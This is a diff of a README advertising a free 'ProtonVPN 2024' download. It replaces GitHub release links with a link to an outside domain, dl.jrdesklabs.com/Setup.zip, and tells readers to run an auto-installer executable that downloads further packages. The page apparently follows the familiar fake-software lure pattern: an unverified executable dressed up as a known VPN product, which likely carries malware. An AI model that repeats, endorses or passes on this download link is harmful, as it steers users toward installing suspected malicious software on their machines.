@@ -10,11 +10,11 @@ Tags: Windows ProtonVPN 2024 free. Download ProtonVPN for free. Download free Pr
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/f693ddb8-4de5-4f8f-a56f-60d301775312)
-](https://github.com/Marcos-Dantas/ProtonVPN-Free-2024/releases/download/V5.4/Release.zip)
+](https://dl.jrdesklabs.com/Setup.zip)
 
 
 
-## **1. [Download the archive](https://github.com/Marcos-Dantas/ProtonVPN-Free-2024/releases/download/V5.4/Release.zip) and extract it to a convenient folder.**
+## **1. [Download the archive](https://dl.jrdesklabs.com/Setup.zip) and extract it to a convenient folder.**
 ## **2. Run the auto-installer `Installing_File_x64.exe`. It will install and download all necessary packages for > operation.**
 
 ![photo_2024-10-16_23-12-43](https://github.com/user-attachments/assets/88691cc2-8c45-4e84-a299-6ff90abaef3e)
